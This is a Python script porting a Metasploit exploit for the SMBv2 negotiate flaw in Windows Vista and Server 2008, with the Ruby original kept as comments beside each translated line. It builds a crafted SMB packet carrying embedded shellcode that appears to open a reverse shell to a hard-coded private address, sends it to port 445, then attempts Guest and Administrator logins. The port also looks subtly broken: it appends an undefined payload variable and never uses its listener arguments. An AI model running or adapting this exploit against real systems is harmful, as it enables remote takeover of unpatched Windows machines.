#!/usr/bin/env python

import sys, socket
import struct
import argparse
import time
from impacket import smb 

#EXITFUNC = Thread

# 'Payload'        =>
#                 {
#                     'Space'           => 1024,
#                     'StackAdjustment' => -3500,
#                     'DisableNops'     => true,
#                     'EncoderType'     => Msf::Encoder::Type::Raw,
#                     'ExtendedOptions' =>
#                         {
#                             'Stager'  => 'stager_sysenter_hook',
#                         }
#                 },

# 'Targets'        =>
#                 [
#                     [ 'Windows Vista SP1/SP2 and Server 2008 (x86)',
#                         {
#                             'Ret'            => 0xFFD00D09, # "POP ESI; RET" from the kernels HAL memory region ...no ASLR :)
#                             'ReadAddress'    => 0xFFDF0D04, # A readable address from kernel space (no nulls in address).
#                             'ProcessIDHigh'  => 0x0217,     # srv2!SrvSnapShotScavengerTimer
#                             'MagicIndex'     => 0x3FFFFFB4, # (DWORD)( MagicIndex*4 + 0x130 ) == 0
#                         }
#                     ],
#                 ],


# register_options(
#             [
#                 Opt::RPORT(445),
#                 OptInt.new( 'WAIT', [ true,  "The number of seconds to wait for the attack to complete.", 180 ] )
#             ], self.class)

# def exploit
#         print_status( "Connecting to the target (#{datastore['RHOST']}:#{datastore['RPORT']})..." )
#         connect


host = sys.argv[1]
port = 445;
wait_time = int(sys.argv[2])
lhost = sys.argv[3]
lport = sys.argv[4]
smb_name = sys.argv[5]

read_address = 0xFFDF0D04
magic_index = 0x3FFFFFB4
return_address = 0xFFD00D09
process_id_high = 0x0217

buf =  ""
buf += "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
buf += "\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
buf += "\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b"
buf += "\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0"
buf += "\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b"
buf += "\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01"
buf += "\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2"
buf += "\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
buf += "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b"
buf += "\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
buf += "\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68"
buf += "\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4"
buf += "\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50"
buf += "\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
buf += "\x68\xc0\xa8\x1e\x49\x68\x02\x00\x11\x5c\x89\xe6\x6a"
buf += "\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d"
buf += "\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56"
buf += "\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10"
buf += "\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
buf += "\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56"
buf += "\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d"
buf += "\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += "\xff\xd5"


payloads = buf

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#         # we use ReadAddress to avoid problems in srv2!SrvProcCompleteRequest
#         # and srv2!SrvProcPartialCompleteCompoundedRequest
#         dialects = [ [ target['ReadAddress'] ].pack("V") * 25, "SMB 2.002" ]

dialects = [ struct.pack('<I',read_address) * 25,"SMB 2.002"]


#         data  = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')
data = ''.join( "\x02" + dialect + "\x00" for dialect in dialects)

#         data += [ 0x00000000 ].pack("V") * 37 # Must be NULL's
data += struct.pack('<I', 0x00000000) * 37
#         data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34 (known stability issue with srv2!SrvConsumeDataAndComplete2+6b)
data += struct.pack('<I', 0xFFFFFFFF)
#         data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34
data += struct.pack('<I', 0xFFFFFFFF)
#         data += [ 0x42424242 ].pack("V") * 7  # Unused
data += struct.pack('<I', 0x42424242) * 7
#         data += [ target['MagicIndex'] ].pack("V") # An index to force an increment the SMB header value :) (srv2!SrvConsumeDataAndComplete2+0x7E)
data += struct.pack('<I', magic_index)
#         data += [ 0x41414141 ].pack("V") * 6  # Unused
data += struct.pack('<I', 0x41414141) * 6
#         data += [ target.ret ].pack("V")      # EIP Control thanks to srv2!SrvProcCompleteRequest+0xD2
data += struct.pack('<I', return_address)
#         data += payload.encoded               # Our ring0 -> ring3 shellcode
data += payload

# We gain code execution by returning into the SMB packet, begining with its header.
# The SMB packets Magic Header value is 0xFF534D42 which assembles to "CALL DWORD PTR [EBX+0x4D]; INC EDX"
# This will cause an access violation if executed as we can never set EBX to a valid pointer.
# To overcome this we force an increment of the header value (via MagicIndex), transforming it to 0x00544D42.
# This assembles to "ADD BYTE PTR [EBP+ECX*2+0x42], DL" which is fine as ECX will be zero and EBP is a vaild pointer.
# We patch the Signature1 value to be a jump forward into our shellcode.

#         packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
#         packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
#         packet['Payload']['SMB'].v['Flags1']        = 0x18
#         packet['Payload']['SMB'].v['Flags2']        = 0xC853
#         packet['Payload']['SMB'].v['ProcessIDHigh'] = target['ProcessIDHigh']
#         packet['Payload']['SMB'].v['Signature1']    = 0x0158E900 # "JMP DWORD 0x15D" ; jump into our ring0 payload.
#         packet['Payload']['SMB'].v['Signature2']    = 0x00000000 # ...
#         packet['Payload']['SMB'].v['MultiplexID']   = rand( 0x10000 )
packet = "\x00\x00\x00$\xFFSMBr\x00\x00\x00\x00\x18S\xC8\x17\x02\x00\xE9X\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\xE8\x00\x00\x00"

#         packet['Payload'].v['Payload']              = data
packet += str(data)

#         packet = packet.to_s

#         print_status( "Sending the exploit packet (#{packet.length} bytes)..." )
print "[*] Sending the exploit packet %i bytes..." % len(packet) 
#         sock.put( packet )
client.sendto(packet, (host,port))


#         wtime = datastore['WAIT'].to_i
wtime = wait_time

#         print_status( "Waiting up to #{wtime} second#{wtime == 1 ? '' : 's'} for exploit to trigger..." )
print "[*] Waiting up to %i seconds for exploit to trigger..." % wait_time
#         stime = Time.now.to_i
stime = int(round(time.time()))

#         poke_logins = %W{Guest Administrator}
poke_logins = ["Guest","Administrator"]
#         poke_logins.each do |login|
for login in poke_logins:

#             begin
#                 sec = connect(false)
	s = smb.SMB('*SMBSERVER',host) 
#                 sec.login(datastore['SMBName'], login, rand_text_alpha(rand(8)+1), rand_text_alpha(rand(8)+1))
	s.login(login,'randompassword') 
#             rescue ::Exception => e
#                 sec.socket.close
#             end
#         end

#         while( stime + wtime > Time.now.to_i )
session = false

while (stime + wtime > int(round(time.time())) ):
	time.sleep(0.25)
	if session:
		break
#             select(nil, nil, nil, 0.25)
#             break if session_created?
#         end

#         handler
#         disconnect
#     end

client.close()
